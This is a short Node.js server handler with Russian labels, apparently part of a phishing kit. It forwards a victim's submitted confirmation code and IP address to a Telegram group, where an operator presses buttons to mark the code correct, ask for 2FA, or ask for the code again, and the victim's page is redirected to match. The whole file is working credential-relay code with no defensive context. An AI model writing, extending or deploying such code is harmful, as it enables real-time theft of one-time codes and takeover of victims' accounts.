const {bot, groupID} = require('../index');

const sendCode = async(req, res) => {
    const {code} = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
              [
                { text: 'Верно', callback_data: 'correct' },
                { text: '2ФА', callback_data: '2fa' },
                { text: 'Не верно', callback_data: 'incorrect' }
              ]
            ]
          }
      };
    bot.sendMessage(groupID, 
`IP заявки: ${ip}
Код подтверждения: ${code}`, 
keyboard);
bot.once('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
  
    if (data === 'correct') {
        bot.sendMessage(groupID, `
IP заявки: ${ip}
Перенаправление на завершение`)
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send('correct');
    }
    if (data === '2fa') {
        bot.sendMessage(groupID, `
IP заявки: ${ip}
Перенаправление на 2fa`)
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send('2fa');
    }
    if (data === 'incorrect') {
        bot.sendMessage(groupID, `
IP заявки: ${ip}
Перенаправление на повторный код`)
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send('incorrect');
    }
});
}

module.exports = sendCode